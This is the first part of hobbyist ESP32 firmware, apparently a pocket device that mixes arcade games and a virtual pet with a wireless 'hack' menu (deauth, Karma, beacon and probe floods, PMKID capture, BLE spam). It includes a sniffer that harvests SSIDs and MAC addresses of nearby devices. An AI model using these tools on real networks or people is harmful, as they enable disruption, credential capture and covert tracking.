/*
 * Cake OS 5.0 - 第 1/3 段
 */
#include <SPI.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <EEPROM.h>
#include <NimBLEDevice.h>
#include <LittleFS.h>
#include <math.h>
using fs::File;
bool littlefsReady = false;
void ensureLittleFS() { if (!littlefsReady) littlefsReady = LittleFS.begin(true); }
TFT_eSPI tft = TFT_eSPI();
#define WIFI_SSID     "你的WiFi名"
#define WIFI_PASSWORD "你的WiFi密码"
#define BTN_UP    0
#define BTN_DOWN  1
#define BTN_LEFT  2
#define BTN_RIGHT 3
const char* VERSION = "5.0";
const char* DEVICE_NAME = "CakeOS";
const char* gameMenu[] = {"Tetris","Breakout","Snake","Dino Run","Flappy Bird","2048","Plane War","Minesweeper","Roguelike"};
const int gameMenuCount = 9;
int selectedGame = 0, gameOffset = 0;
const char* hackMenu[] = {"WiFi Scan","IP Scan","Super Deauth","Karma","Probe Flood","Beacon Flood","PMKID","Sniffer","Key Encoder","Device Tracker","BLE Scan","BLE Spam","Chan Graph","BLE GATT","Tracker Detect","Settings"};
const int hackMenuCount = 16;
int selectedHack = 0, hackOffset = 0;
char g_petMsg[28] = "";
uint16_t g_petMsgColor = TFT_GREEN;
int g_petMsgTimer = 0;
bool g_shopFed = false;
unsigned long lastPressTime[4] = {0,0,0,0};
bool waitingDouble[4] = {false,false,false,false};
const unsigned long DOUBLE_WINDOW = 200;
bool wifiInited = false, bleInited = false;
bool wifiConfigured = false, wifiWasConnected = false;
int lastWifiDisplay = -1;
unsigned long lastWifiCheck = 0;
unsigned long wifiDisconnectTime = 0, wifiReconnectDelay = 3000;
const unsigned long WIFI_MIN_DELAY = 3000, WIFI_MAX_DELAY = 30000;
int wifiDisconnectCount = 0;

#define WIFI_CACHE_ADDR 200
#define WIFI_CACHE_MAGIC 0xB7
struct WifiCache { uint8_t magic, channel, bssid[6]; };
WifiCache wifiCache;
void wifiCacheLoad() {
  EEPROM.get(WIFI_CACHE_ADDR, wifiCache);
  if (wifiCache.magic != WIFI_CACHE_MAGIC) { wifiCache.magic = WIFI_CACHE_MAGIC; wifiCache.channel = 0; memset(wifiCache.bssid,0,6); }
}
void wifiCacheSave(uint8_t ch, uint8_t* bssid) {
  wifiCache.magic = WIFI_CACHE_MAGIC; wifiCache.channel = ch; memcpy(wifiCache.bssid,bssid,6);
  EEPROM.put(WIFI_CACHE_ADDR, wifiCache); EEPROM.commit();
}
bool wifiCacheValid() { return wifiCache.magic == WIFI_CACHE_MAGIC && wifiCache.channel >= 1 && wifiCache.channel <= 13; }

#define PET2_EEPROM_ADDR 110
#define PET2_MAGIC     0xCA33
#define PET2_MAGIC_OLD 0xCA32
struct Pet2Data {
  uint8_t hunger, mood, energy, clean, health, bond, level;
  uint32_t exp;
  uint16_t coins, ach, ownedSkins;
  uint8_t currentSkin, stage;
  uint16_t taskProgress[10];
  uint16_t totalFeed, totalPlay, totalSleep, totalClean;
  uint16_t magic;
};
struct Pet2DataOld {
  uint8_t hunger, mood, energy, clean, health, bond, level;
  uint16_t exp;
  uint16_t coins, ach, ownedSkins;
  uint8_t currentSkin, stage;
  uint16_t taskProgress[10];
  uint16_t totalFeed, totalPlay, totalSleep, totalClean;
  uint16_t magic;
};
Pet2Data pet2;

int8_t pet2ClampAdd(uint8_t& v, int delta) {
  int nv = (int)v + delta;
  if (nv < 0) nv = 0;
  if (nv > 100) nv = 100;
  int8_t d = (int8_t)(nv - (int)v);
  v = (uint8_t)nv;
  return d;
}

struct PetFood { const char* name; int8_t dHunger, dMood, dClean, dHealth, dEnergy; uint16_t cost; };
const PetFood PET_FOODS[] = {
  {"Fish",20,5,0,0,0,5},{"Seaweed",15,0,-5,0,0,3},{"Cake",25,15,0,-5,0,10},
  {"Vitamin",10,5,0,20,0,15},{"Steak",40,5,0,0,0,20},{"IceCream",10,30,-10,0,0,12},
  {"Sushi",30,10,0,5,0,25},{"EnergyDrink",5,5,0,-5,25,18},{"Salad",18,3,10,5,0,8},
  {"Chocolate",10,25,-5,-5,5,15},{"Soup",30,10,0,5,5,10},{"Candy",8,20,0,-3,0,6}
};
const int PET_FOOD_COUNT = 12;
struct PetItem { const char* name; int8_t dHunger, dMood, dClean, dHealth, dEnergy, dBond; uint16_t cost; };
const PetItem PET_ITEMS[] = {
  {"Soap",0,0,100,0,0,2,8},{"ToyBall",0,30,0,0,0,3,15},{"Medicine",0,0,0,40,0,5,30},
  {"Coffee",0,0,0,0,30,2,12},{"MusicBox",0,20,0,0,0,5,20}
};
const int PET_ITEM_COUNT = 5;
struct TaskTemplate { const char* desc; uint16_t base; uint8_t type; };
const TaskTemplate TASK_TPL[10] = {
  {"Feed",3,0},{"Play",2,1},{"Sleep",2,2},{"Clean",1,3},{"Level",3,4},
  {"Coins",20,5},{"Games",1,6},{"Score",30,7},{"Mood",50,8},{"Bond",10,9}
};
uint32_t pet2ExpNeeded() {
  double e = 50.0 * pow(1.18, pet2.level - 1);
  if (e > 5000000.0) e = 5000000.0;
  return (uint32_t)e;
}
uint16_t taskNeed(int stage, int idx) {
  double f = pow(1.3, stage - 1);
  uint32_t need = (uint32_t)(TASK_TPL[idx].base * f);
  if (need < TASK_TPL[idx].base) need = TASK_TPL[idx].base;
  if (need > 60000) need = 60000;
  return (uint16_t)need;
}
void pet2Load() {
  EEPROM.get(PET2_EEPROM_ADDR, pet2);
  bool needMigrate = false;
  {
    Pet2DataOld old;
    EEPROM.get(PET2_EEPROM_ADDR, old);
    if (old.magic == PET2_MAGIC_OLD) {
      pet2.hunger = old.hunger; pet2.mood = old.mood; pet2.energy = old.energy;
      pet2.clean = old.clean; pet2.health = old.health; pet2.bond = old.bond;
      pet2.level = old.level; pet2.exp = old.exp; pet2.coins = old.coins;
      pet2.ach = old.ach; pet2.ownedSkins = old.ownedSkins;
      pet2.currentSkin = old.currentSkin; pet2.stage = old.stage;
      for (int i=0;i<10;i++) pet2.taskProgress[i] = old.taskProgress[i];
      pet2.totalFeed = old.totalFeed; pet2.totalPlay = old.totalPlay;
      pet2.totalSleep = old.totalSleep; pet2.totalClean = old.totalClean;
      pet2.magic = PET2_MAGIC;
      EEPROM.put(PET2_EEPROM_ADDR, pet2);
      EEPROM.commit();
      needMigrate = true;
    }
  }
  if (!needMigrate && pet2.magic != PET2_MAGIC) {
    pet2.hunger=80; pet2.mood=80; pet2.energy=80; pet2.clean=90; pet2.health=100;
    pet2.bond=10; pet2.level=1; pet2.exp=0; pet2.coins=10; pet2.ach=0;
    pet2.ownedSkins=0x01; pet2.currentSkin=0; pet2.stage=1;
    for (int i=0;i<10;i++) pet2.taskProgress[i]=0;
    pet2.totalFeed=0; pet2.totalPlay=0; pet2.totalSleep=0; pet2.totalClean=0;
    pet2.magic = PET2_MAGIC;
    EEPROM.put(PET2_EEPROM_ADDR, pet2); EEPROM.commit();
  }
  if (pet2.hunger>100) pet2.hunger=100;
  if (pet2.mood>100) pet2.mood=100;
  if (pet2.energy>100) pet2.energy=100;
  if (pet2.clean>100) pet2.clean=100;
  if (pet2.health>100) pet2.health=100;
  if (pet2.bond>100) pet2.bond=100;
  if (pet2.level<1) pet2.level=1;
  if (pet2.level>100) pet2.level=100;
  if (pet2.stage<1) pet2.stage=1;
  if (pet2.stage>30) pet2.stage=30;
}
void pet2Save() { EEPROM.put(PET2_EEPROM_ADDR, pet2); EEPROM.commit(); }
void pet2Unlock(uint8_t b) { if (!(pet2.ach & (1<<b))) { pet2.ach |= (1<<b); } }
void pet2AddExp(uint16_t n) {
  if (pet2.bond >= 70) n = (n*12)/10;
  uint8_t oldLevel = pet2.level;
  pet2.exp += n;
  while (pet2.level < 100 && pet2.exp >= pet2ExpNeeded()) { pet2.exp -= pet2ExpNeeded(); pet2.level++; }
  if (pet2.level >= 100) pet2.exp = 0;
  if (pet2.level >= 5)  pet2Unlock(4);
  if (pet2.level >= 10) pet2Unlock(5);
  if (pet2.level > oldLevel) {
    for (int i=0;i<10;i++) {
      if (TASK_TPL[i].type != 4) continue;
      if (pet2.taskProgress[i] >= 100) continue;
      uint16_t need = taskNeed(pet2.stage, i);
      pet2.taskProgress[i] = (pet2.level >= need) ? 100 : (pet2.level*100/need);
    }
  }
  for (int i=0;i<10;i++) {
    if (TASK_TPL[i].type != 8) continue;
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i);
    pet2.taskProgress[i] = (pet2.mood >= need) ? 100 : (pet2.mood*100/need);
  }
  pet2Save();
}
void pet2AddCoins(uint16_t n) {
  pet2.coins += n;
  if (pet2.coins >= 100) pet2Unlock(6);
  for (int i=0;i<10;i++) {
    if (TASK_TPL[i].type != 5) continue;
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i);
    pet2.taskProgress[i] = (pet2.coins >= need) ? 100 : (pet2.coins*100/need);
  }
  pet2Save();
}
void pet2AddBond(uint8_t n) {
  pet2.bond += n; if (pet2.bond>100) pet2.bond=100;
  for (int i=0;i<10;i++) {
    if (TASK_TPL[i].type != 9) continue;
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i);
    pet2.taskProgress[i] = (pet2.bond >= need) ? 100 : (pet2.bond*100/need);
  }
  pet2Save();
}
void pet2TaskAdd(uint8_t type, uint16_t amount) {
  for (int i=0;i<10;i++) {
    if (TASK_TPL[i].type != type) continue;
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i);
    uint32_t cur = ((uint32_t)pet2.taskProgress[i] * need) / 100 + amount;
    if (cur >= need) pet2.taskProgress[i] = 100;
    else pet2.taskProgress[i] = (cur*100)/need;
  }
  pet2Save();
}
void pet2TaskSet(uint8_t type, uint16_t value) {
  for (int i=0;i<10;i++) {
    if (TASK_TPL[i].type != type) continue;
    if (pet2.taskProgress[i] >= 100) continue;
    uint16_t need = taskNeed(pet2.stage, i);
    if (value >= need) pet2.taskProgress[i] = 100;
    else pet2.taskProgress[i] = (value*100)/need;
  }
  pet2Save();
}
bool pet2StageComplete() { for (int i=0;i<10;i++) if (pet2.taskProgress[i] < 100) return false; return true; }
void pet2AdvanceStage() {
  if (pet2.stage < 30) {
    pet2.coins += pet2.stage * 50;
    pet2AddExp(pet2.stage * 20);
    pet2.stage++;
    for (int i=0;i<10;i++) pet2.taskProgress[i]=0;
  }
  pet2Save();
}
void gameReward(uint16_t base) {
  if (pet2.mood >= 70) base = (base * 12) / 10;
  else if (pet2.mood < 30) base = (base * 8) / 10;
  if (pet2.bond >= 80) base = (base * 11) / 10;
  if (base < 1) base = 1;
  if (base > 40) base = 40;
  pet2AddCoins(base);
  pet2.mood += 3; if (pet2.mood>100) pet2.mood=100;
  pet2AddExp(3); pet2AddBond(1);
  pet2Save();
}

#define KEY_EEPROM_ADDR 300
#define KEY_MAGIC 0xA5
struct KeyModel { const char* name; uint8_t teeth, maxDepth; };
const KeyModel MODELS[] = {{"SC4",6,9},{"KW1",5,6},{"SC1",5,8},{"M1",5,6},{"WR5",5,6}};
const int MODEL_COUNT = 5;
uint8_t keyModel = 0, keyTeeth[8];
void keyLoad() {
  if (EEPROM.read(KEY_EEPROM_ADDR) != KEY_MAGIC) {
    EEPROM.write(KEY_EEPROM_ADDR, KEY_MAGIC); EEPROM.write(KEY_EEPROM_ADDR+1, 0);
    for (int i=0;i<8;i++) EEPROM.write(KEY_EEPROM_ADDR+2+i,0);
    EEPROM.commit(); keyModel=0; memset(keyTeeth,0,8); return;
  }
  keyModel = EEPROM.read(KEY_EEPROM_ADDR+1);
  if (keyModel >= MODEL_COUNT) keyModel = 0;
  for (int i=0;i<8;i++) keyTeeth[i] = EEPROM.read(KEY_EEPROM_ADDR+2+i);
  for (int i=0;i<8;i++) if (keyTeeth[i] > MODELS[keyModel].maxDepth) keyTeeth[i] = MODELS[keyModel].maxDepth;
}
void keySave() {
  EEPROM.write(KEY_EEPROM_ADDR, KEY_MAGIC); EEPROM.write(KEY_EEPROM_ADDR+1, keyModel);
  for (int i=0;i<8;i++) EEPROM.write(KEY_EEPROM_ADDR+2+i, keyTeeth[i]);
  EEPROM.commit();
}

#define DINO_EEPROM_ADDR 400
#define DINO_MAGIC 0xD1
struct DinoData { uint16_t bestDistance, bestCactus; uint8_t ownedSkins, currentSkin, magic; };
DinoData dinoData;
struct DinoSkin { const char* name; uint16_t color, cost; };
const DinoSkin DINO_SKINS[] = {{"Green",0x07E0,0},{"Red",0xF800,25},{"Blue",0x07FF,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int DINO_SKIN_COUNT = 5;
void dinoLoad() {
  EEPROM.get(DINO_EEPROM_ADDR, dinoData);
  if (dinoData.magic != DINO_MAGIC) {
    dinoData.bestDistance=0; dinoData.bestCactus=0; dinoData.ownedSkins=0x01; dinoData.currentSkin=0; dinoData.magic=DINO_MAGIC;
    EEPROM.put(DINO_EEPROM_ADDR, dinoData); EEPROM.commit();
  }
  if (dinoData.currentSkin >= DINO_SKIN_COUNT) dinoData.currentSkin=0;
  dinoData.ownedSkins |= 0x01;
}
void dinoSave() { EEPROM.put(DINO_EEPROM_ADDR, dinoData); EEPROM.commit(); }

#define TET_EEPROM_ADDR 420
#define TET_MAGIC 0x7E
struct TetrisData { uint16_t bestScore, bestLines; uint8_t ownedSkins, currentSkin, magic; };
TetrisData tetData;
struct TetrisSkin { const char* name; uint16_t color, cost; };
const TetrisSkin TET_SKINS[] = {{"Green",0x07E0,0},{"Blue",0x07FF,25},{"Red",0xF800,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int TET_SKIN_COUNT = 5;
void tetLoad() {
  EEPROM.get(TET_EEPROM_ADDR, tetData);
  if (tetData.magic != TET_MAGIC) {
    tetData.bestScore=0; tetData.bestLines=0; tetData.ownedSkins=0x01; tetData.currentSkin=0; tetData.magic=TET_MAGIC;
    EEPROM.put(TET_EEPROM_ADDR, tetData); EEPROM.commit();
  }
  if (tetData.currentSkin >= TET_SKIN_COUNT) tetData.currentSkin=0;
  tetData.ownedSkins |= 0x01;
}
void tetSave() { EEPROM.put(TET_EEPROM_ADDR, tetData); EEPROM.commit(); }

#define BRK_EEPROM_ADDR 440
#define BRK_MAGIC 0x8B
struct BreakoutData { uint16_t bestScore, bestBricks; uint8_t ownedSkins, currentSkin, magic; };
BreakoutData brkData;
struct BreakoutSkin { const char* name; uint16_t brickColor, ballColor, cost; };
const BreakoutSkin BRK_SKINS[] = {{"Blue",0x001F,0x07E0,0},{"Red",0xF800,0xFFE0,25},{"Green",0x07E0,0xF800,50},{"Purple",0xF81F,0x07FF,100},{"Gold",0xFFE0,0xF81F,200}};
const int BRK_SKIN_COUNT = 5;
void brkLoad() {
  EEPROM.get(BRK_EEPROM_ADDR, brkData);
  if (brkData.magic != BRK_MAGIC) {
    brkData.bestScore=0; brkData.bestBricks=0; brkData.ownedSkins=0x01; brkData.currentSkin=0; brkData.magic=BRK_MAGIC;
    EEPROM.put(BRK_EEPROM_ADDR, brkData); EEPROM.commit();
  }
  if (brkData.currentSkin >= BRK_SKIN_COUNT) brkData.currentSkin=0;
  brkData.ownedSkins |= 0x01;
}
void brkSave() { EEPROM.put(BRK_EEPROM_ADDR, brkData); EEPROM.commit(); }

#define FLP_EEPROM_ADDR 460
#define FLP_MAGIC 0xF1
struct FlappyData { uint16_t bestScore; uint8_t ownedSkins, currentSkin, magic; };
FlappyData flpData;
struct FlappySkin { const char* name; uint16_t color, cost; };
const FlappySkin FLP_SKINS[] = {{"Yellow",0xFFE0,0},{"Red",0xF800,25},{"Blue",0x07FF,50},{"Purple",0xF81F,100},{"Gold",0xFFE0,200}};
const int FLP_SKIN_COUNT = 5;
void flpLoad() {
  EEPROM.get(FLP_EEPROM_ADDR, flpData);
  if (flpData.magic != FLP_MAGIC) {
    flpData.bestScore=0; flpData.ownedSkins=0x01; flpData.currentSkin=0; flpData.magic=FLP_MAGIC;
    EEPROM.put(FLP_EEPROM_ADDR, flpData); EEPROM.commit();
  }
  if (flpData.currentSkin >= FLP_SKIN_COUNT) flpData.currentSkin=0;
  flpData.ownedSkins |= 0x01;
}
void flpSave() { EEPROM.put(FLP_EEPROM_ADDR, flpData); EEPROM.commit(); }

#define G2_EEPROM_ADDR 480
#define G2_MAGIC 0x21
struct G2Data { uint16_t bestScore, bestTile; uint8_t ownedSkins, currentSkin, magic; };
G2Data g2Data;
void g2Load() {
  EEPROM.get(G2_EEPROM_ADDR, g2Data);
  if (g2Data.magic != G2_MAGIC) {
    g2Data.bestScore=0; g2Data.bestTile=0; g2Data.ownedSkins=0x01; g2Data.currentSkin=0; g2Data.magic=G2_MAGIC;
    EEPROM.put(G2_EEPROM_ADDR, g2Data); EEPROM.commit();
  }
}
void g2Save() { EEPROM.put(G2_EEPROM_ADDR, g2Data); EEPROM.commit(); }

#define PLN_EEPROM_ADDR 500
#define PLN_MAGIC 0xA7
struct PlaneData { uint16_t bestScore, bestKills; uint8_t ownedSkins, currentSkin, magic; };
PlaneData plnData;
void plnLoad() {
  EEPROM.get(PLN_EEPROM_ADDR, plnData);
  if (plnData.magic != PLN_MAGIC) {
    plnData.bestScore=0; plnData.bestKills=0; plnData.ownedSkins=0x01; plnData.currentSkin=0; plnData.magic=PLN_MAGIC;
    EEPROM.put(PLN_EEPROM_ADDR, plnData); EEPROM.commit();
  }
}
void plnSave() { EEPROM.put(PLN_EEPROM_ADDR, plnData); EEPROM.commit(); }

#define MIN_EEPROM_ADDR 520
#define MIN_MAGIC 0xA8
struct MineData { uint16_t bestTime; uint8_t bestDiff, ownedSkins, currentSkin, magic; };
MineData minData;
void minLoad() {
  EEPROM.get(MIN_EEPROM_ADDR, minData);
  if (minData.magic != MIN_MAGIC) {
    minData.bestTime=0; minData.bestDiff=0; minData.ownedSkins=0x01; minData.currentSkin=0; minData.magic=MIN_MAGIC;
    EEPROM.put(MIN_EEPROM_ADDR, minData); EEPROM.commit();
  }
}
void minSave() { EEPROM.put(MIN_EEPROM_ADDR, minData); EEPROM.commit(); }

#define ROG_EEPROM_ADDR 560
#define ROG_MAGIC 0xA9
struct RogData { uint16_t bestScore; uint8_t bestLevel; uint16_t bestTime; uint8_t magic; };
RogData rogData;
void rogLoad() {
  EEPROM.get(ROG_EEPROM_ADDR, rogData);
  if (rogData.magic != ROG_MAGIC) {
    rogData.bestScore=0; rogData.bestLevel=1; rogData.bestTime=0; rogData.magic=ROG_MAGIC;
    EEPROM.put(ROG_EEPROM_ADDR, rogData); EEPROM.commit();
  }
}
void rogSave() { EEPROM.put(ROG_EEPROM_ADDR, rogData); EEPROM.commit(); }

void wifiFastBegin() {
  if (!wifiConfigured) return;
  WiFi.mode(WIFI_STA); WiFi.setSleep(false); esp_wifi_set_max_tx_power(80);
  if (wifiCacheValid()) WiFi.begin(WIFI_SSID, WIFI_PASSWORD, wifiCache.channel, wifiCache.bssid);
  else WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
}
void deinitWifi() { if (wifiInited) { esp_wifi_stop(); esp_wifi_deinit(); wifiInited=false; } }
void restartWifi() { if (!wifiConfigured) return; wifiFastBegin(); wifiDisconnectTime=millis(); wifiDisconnectCount=0; wifiReconnectDelay=WIFI_MIN_DELAY; }
void deinitBLE() { if (bleInited) { NimBLEDevice::deinit(true); bleInited=false; } }

#define MAX_BLE_DEVICES 20
struct BLEDeviceInfo { char name[32]; int rssi; char mac[12]; };
BLEDeviceInfo bleDevices[MAX_BLE_DEVICES];
NimBLEAddress bleAddrCache[MAX_BLE_DEVICES];
int bleDeviceCount = 0;
#define MAX_SNIFF 15
#define MAX_TRACK 15
struct SniffEntry { uint8_t mac[6]; char ssid[33]; int rssi; };
SniffEntry sniffList[MAX_SNIFF];
int sniffCount = 0;
volatile bool sniffRunning = false;
struct TrackEntry { uint8_t mac[6]; int rssi; unsigned long lastSeen; };
TrackEntry trackList[MAX_TRACK];
int trackCount = 0;
volatile bool trackRunning = false;

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  uint8_t fc = p[0]; uint8_t sub = (fc>>4)&0x0F; uint8_t ftype = (fc>>2)&0x03;
  if (sniffRunning && ftype==0x00 && sub==4) {
    int i=24; char ssid[33]={0};
    while (i+1<len) {
      uint8_t tag=p[i], tagLen=p[i+1];
      if (i+2+tagLen>len) break;
      if (tag==0 && tagLen>0 && tagLen<=32) { memcpy(ssid,&p[i+2],tagLen); ssid[tagLen]=0; break; }
      i += 2+tagLen;
    }
    if (ssid[0]!=0) {
      bool found=false;
      for (int k=0;k<sniffCount;k++) if (memcmp(sniffList[k].mac,&p[10],6)==0) { strncpy(sniffList[k].ssid,ssid,32); found=true; break; }
      if (!found && sniffCount<MAX_SNIFF) {
        memcpy(sniffList[sniffCount].mac,&p[10],6);
        strncpy(sniffList[sniffCount].ssid,ssid,32);
        sniffList[sniffCount].rssi=pkt->rx_ctrl.rssi; sniffCount++;
      }
    }
  }
  if (trackRunning) {
    uint8_t* srcMac=&p[10]; bool found=false;
    for (int k=0;k<trackCount;k++) if (memcmp(trackList[k].mac,srcMac,6)==0) { trackList[k].rssi=pkt->rx_ctrl.rssi; trackList[k].lastSeen=millis(); found=true; break; }
    if (!found && trackCount<MAX_TRACK) {
      memcpy(trackList[trackCount].mac,srcMac,6);
      trackList[trackCount].rssi=pkt->rx_ctrl.rssi;
      trackList[trackCount].lastSeen=millis(); trackCount++;
    }
  }
}

void clearAll() { tft.fillScreen(TFT_BLACK); }
void titleBar(const char* t) { tft.drawString(t, 2, 0); }

void updateWifiStatusBar() {
  int state;
  if (WiFi.status()==WL_CONNECTED) state=1;
  else if (wifiConfigured && wifiDisconnectTime>0) state=2;
  else state=0;

  static bool cacheSaved = false;
  if (state == 1 && !cacheSaved) {
    uint8_t* bssid = WiFi.BSSID();
    uint8_t ch = WiFi.channel();
    if (bssid && ch >= 1 && ch <= 13) {
      wifiCacheSave(ch, bssid);
      cacheSaved = true;
    }
  }
  if (state != 1) cacheSaved = false;

  if (state==lastWifiDisplay) return;
  lastWifiDisplay=state;
  tft.fillRect(95,0,65,10,TFT_BLACK);
  if (state==1) { tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawString("WIFI:on",100,0); }
  else if (state==2) { tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("WIFI...",100,0); }
  else { tft.setTextColor(TFT_RED,TFT_BLACK); tft.drawString("WIFI:off",100,0); }
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
}

void drawAppIcon(int x, int y, uint8_t type, uint16_t color) {
  switch (type) {
    case 0: tft.drawCircle(x + 6, y + 9, 2, color); tft.drawCircle(x + 6, y + 9, 4, color); tft.drawCircle(x + 6, y + 9, 6, color); break;
    case 1: tft.drawRect(x + 1, y + 2, 10, 8, color); tft.fillRect(x + 3, y + 4, 6, 4, color); break;
    case 2: tft.fillTriangle(x + 7, y + 1, x + 3, y + 6, x + 6, y + 6, color); tft.fillTriangle(x + 5, y + 6, x + 8, y + 6, x + 4, y + 11, color); break;
    case 3: tft.drawCircle(x + 6, y + 6, 5, color); tft.drawPixel(x + 4, y + 5, color); tft.drawPixel(x + 8, y + 5, color); tft.drawCircleHelper(x + 6, y + 7, 2, 0x0C, color); break;
    case 4: for (int i = 0; i < 3; i++) tft.drawFastHLine(x + 1, y + 3 + i * 3, 10, color); break;
    case 5: tft.fillRect(x + 5, y + 5, 2, 6, color); tft.drawCircle(x + 6, y + 5, 4, color); tft.drawCircle(x + 6, y + 5, 6, color); break;
    case 6: tft.drawRoundRect(x + 3, y + 5, 6, 6, 1, color); tft.drawCircle(x + 6, y + 3, 2, color); break;
    case 7: tft.drawCircle(x + 6, y + 6, 4, color); tft.fillCircle(x + 6, y + 6, 2, color); break;
    case 8: tft.drawCircle(x + 3, y + 6, 2, color); tft.fillRect(x + 5, y + 5, 6, 2, color); tft.drawPixel(x + 10, y + 7, color); break;
    case 9: tft.drawCircle(x + 6, y + 4, 3, color); tft.fillTriangle(x + 3, y + 6, x + 9, y + 6, x + 6, y + 11, color); break;
    case 10:
      tft.drawLine(x + 6, y + 1, x + 9, y + 4, color); tft.drawLine(x + 9, y + 4, x + 3, y + 9, color);
      tft.drawLine(x + 3, y + 3, x + 9, y + 8, color); tft.drawLine(x + 9, y + 8, x + 6, y + 11, color);
      tft.drawLine(x + 3, y + 3, x + 6, y + 1, color); break;
    case 11:
      tft.drawLine(x + 4, y + 2, x + 7, y + 5, color); tft.drawLine(x + 7, y + 5, x + 2, y + 8, color);
      tft.drawLine(x + 2, y + 4, x + 7, y + 7, color);
      tft.fillRect(x + 10, y + 2, 2, 5, color); tft.fillRect(x + 10, y + 8, 2, 2, color); break;
    case 12:
      tft.fillRect(x + 1, y + 7, 2, 4, color); tft.fillRect(x + 4, y + 4, 2, 7, color);
      tft.fillRect(x + 7, y + 6, 2, 5, color); tft.fillRect(x + 10, y + 2, 2, 9, color);
      tft.drawLine(x + 1, y + 5, x + 5, y + 3, TFT_YELLOW); tft.drawLine(x + 5, y + 3, x + 9, y + 5, TFT_YELLOW);
      tft.drawLine(x + 9, y + 5, x + 11, y + 1, TFT_YELLOW); break;
    case 13: tft.drawCircle(x + 3, y + 3, 2, color); tft.drawCircle(x + 9, y + 9, 2, color); tft.drawLine(x + 4, y + 4, x + 8, y + 8, color); tft.drawPixel(x + 6, y + 6, color); break;
    case 14: tft.drawCircle(x + 6, y + 6, 5, color); tft.drawCircle(x + 6, y + 6, 3, color); tft.fillCircle(x + 6, y + 6, 1, color); tft.drawLine(x + 6, y + 6, x + 10, y + 2, color); break;
    case 15: tft.drawCircle(x + 6, y + 6, 4, color); tft.drawCircle(x + 6, y + 6, 2, color); tft.drawPixel(x + 6, y + 1, color); tft.drawPixel(x + 6, y + 11, color); tft.drawPixel(x + 1, y + 6, color); tft.drawPixel(x + 11, y + 6, color); break;
    case 20: tft.fillRect(x + 2, y + 2, 4, 4, color); tft.fillRect(x + 6, y + 2, 4, 4, color); tft.fillRect(x + 6, y + 6, 4, 4, color); break;
    case 21: tft.fillRect(x + 1, y + 9, 10, 2, color); tft.fillCircle(x + 6, y + 4, 2, color); break;
    case 22: tft.fillRect(x + 1, y + 5, 3, 3, color); tft.fillRect(x + 4, y + 5, 3, 3, color); tft.fillRect(x + 7, y + 5, 3, 3, color); tft.fillRect(x + 7, y + 2, 3, 3, color); break;
    case 23:
      tft.fillTriangle(x + 1, y + 4, x + 5, y + 4, x + 2, y + 7, color);
      tft.fillRect(x + 4, y + 3, 6, 6, color); tft.fillRect(x + 8, y + 1, 3, 3, color);
      tft.fillRect(x + 8, y - 1, 5, 3, color); tft.drawPixel(x + 10, y, TFT_BLACK);
      tft.fillRect(x + 13, y + 1, 1, 1, color); tft.fillRect(x + 5, y + 9, 2, 2, color); tft.fillRect(x + 8, y + 9, 2, 2, color); break;
    case 24: tft.fillCircle(x + 6, y + 6, 3, color); tft.fillTriangle(x + 9, y + 6, x + 12, y + 7, x + 9, y + 8, color); tft.drawPixel(x + 7, y + 5, TFT_BLACK); break;
    case 25: tft.drawRect(x + 1, y + 1, 5, 5, color); tft.drawRect(x + 6, y + 1, 5, 5, color); tft.drawRect(x + 1, y + 6, 5, 5, color); tft.fillRect(x + 6, y + 6, 5, 5, color); break;
    case 26: tft.fillTriangle(x + 6, y + 1, x + 3, y + 10, x + 9, y + 10, color); tft.fillRect(x + 1, y + 5, 10, 2, color); tft.fillTriangle(x + 6, y + 4, x + 4, y + 6, x + 8, y + 6, TFT_CYAN); tft.fillRect(x + 5, y + 10, 2, 1, TFT_ORANGE); break;
    case 27: tft.drawLine(x + 3, y + 2, x + 3, y + 10, color); tft.fillTriangle(x + 4, y + 2, x + 9, y + 4, x + 4, y + 6, color); break;
    case 28: tft.drawCircle(x + 6, y + 5, 4, color); tft.fillRect(x + 4, y + 4, 2, 2, TFT_BLACK); tft.fillRect(x + 7, y + 4, 2, 2, TFT_BLACK); tft.fillRect(x + 4, y + 9, 5, 2, color); break;
  }
}

char getKey() {
  unsigned long now = millis();
  int pins[4] = {BTN_UP,BTN_DOWN,BTN_LEFT,BTN_RIGHT};
  for (int i=0;i<4;i++) {
    if (digitalRead(pins[i])==LOW) {
      delay(8);
      if (digitalRead(pins[i])==LOW) {
        unsigned long t0 = millis();
        while (digitalRead(pins[i])==LOW) { if (millis()-t0>300) break; delay(3); }
        if (waitingDouble[i] && (now-lastPressTime[i]<DOUBLE_WINDOW)) {
          waitingDouble[i]=false;
          if (i==3) return 'E';
          if (i==2) return 'X';
        } else { waitingDouble[i]=true; lastPressTime[i]=now; }
      }
    }
  }
  for (int i=0;i<4;i++) {
    if (waitingDouble[i] && (now-lastPressTime[i]>=DOUBLE_WINDOW)) {
      waitingDouble[i]=false;
      if (i==0) return 'U';
      if (i==1) return 'D';
      if (i==2) return 'L';
      if (i==3) return 'R';
    }
  }
  return 0;
}
char getGameKey() {
  int pins[4] = {BTN_UP,BTN_DOWN,BTN_LEFT,BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long HOLD_DELAY=200, REPEAT_INTERVAL=80, DOUBLE_WINDOW_G=400;
  static bool pressed[4] = {false,false,false,false};
  static unsigned long pressStart[4]={0,0,0,0};
  static unsigned long lastPress[4]={0,0,0,0};
  static unsigned long lastRepeat[4]={0,0,0,0};
  for (int i=0;i<4;i++) {
    bool nowPressed = (digitalRead(pins[i])==LOW);
    if (nowPressed && !pressed[i]) {
      delay(2);
      if (digitalRead(pins[i])!=LOW) continue;
      pressed[i]=true;
